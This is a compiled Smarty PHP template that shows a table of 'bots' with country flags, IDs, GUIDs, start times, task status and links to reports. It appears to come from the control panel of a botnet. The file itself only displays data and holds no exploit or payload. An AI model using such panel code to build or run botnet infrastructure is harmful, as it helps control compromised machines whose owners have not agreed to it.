<?php /* Smarty version Smarty-3.0.6, created on 2011-02-20 23:39:35
         compiled from "/var/www/maincp/client/templates/task_info_sub.tpl" */ ?>
<?php /*%%SmartyHeaderCode:10538193834d61a637ada342-56256133%%*/if(!defined('SMARTY_DIR')) exit('no direct access allowed');
$_smarty_tpl->decodeProperties(array (
  'file_dependency' => 
  array (
    'f5852fe6d6ae606d6a75d2727a656725a75500b1' => 
    array (
      0 => '/var/www/maincp/client/templates/task_info_sub.tpl',
      1 => 1298244963,
      2 => 'file',
    ),
  ),
  'nocache_hash' => '10538193834d61a637ada342-56256133',
  'function' => 
  array (
  ),
  'has_nocache_code' => false,
)); /*/%%SmartyHeaderCode%%*/?>
<?php if (isset($_smarty_tpl->getVariable('BOTS',null,true,false)->value)){?>
<br><hr color="#cccccc" size="1"><br>
<table style="border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 240); width: 600px;" border="1" cellpadding="3" cellspacing="0">
<th width='30'>#</th><th width='40'>Country</th><th width='40'>ID</th><th>GUID</th><th>Start time</th><th>Status</th><th style='width:16px'>Info</th>

<?php  $_smarty_tpl->tpl_vars['BOT'] = new Smarty_Variable;
 $_from = $_smarty_tpl->getVariable('BOTS')->value; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array');}
 $_smarty_tpl->tpl_vars['smarty']->value['foreach']['bots']['iteration']=0;
if ($_smarty_tpl->_count($_from) > 0){
    foreach ($_from as $_smarty_tpl->tpl_vars['BOT']->key => $_smarty_tpl->tpl_vars['BOT']->value){
 $_smarty_tpl->tpl_vars['smarty']->value['foreach']['bots']['iteration']++;
?>
	<tr>
	<td align='center'><?php echo $_smarty_tpl->getVariable('smarty')->value['foreach']['bots']['iteration'];?>
</td>
	<td align='center'><img src='img/flags/<?php echo $_smarty_tpl->tpl_vars['BOT']->value['CCODE'];?>
.gif'></td>
	<td align='center'><?php echo $_smarty_tpl->tpl_vars['BOT']->value['id_bot'];?>
</td>
	<td align='center'><?php echo $_smarty_tpl->tpl_vars['BOT']->value['guid_bot'];?>
</td>
	<td align='center'><?php echo $_smarty_tpl->tpl_vars['BOT']->value['upStartTime'];?>
</td>
	<td align='center'><b><?php if ($_smarty_tpl->tpl_vars['BOT']->value['upStatus']==1){?>IN PROCESS<?php }elseif($_smarty_tpl->tpl_vars['BOT']->value['upStatus']==3){?>OK<?php }elseif($_smarty_tpl->tpl_vars['BOT']->value['upStatus']==2){?>ERROR<?php }?></b></td>
	<td align='center'>
		<img src="./img/icos/info.png" title="Reports" onclick='load2("./mod/load_reports.php?lid=<?php echo $_smarty_tpl->tpl_vars['BOT']->value['upId'];?>
","task_report");'>
	</td>
	</tr>
<?php }} else { ?>
	<tr><td colspan='5' class='error' align='center'>There are no bots</td></tr>
<?php } ?>

</table>
<?php }?>

<div id='task_report'></div>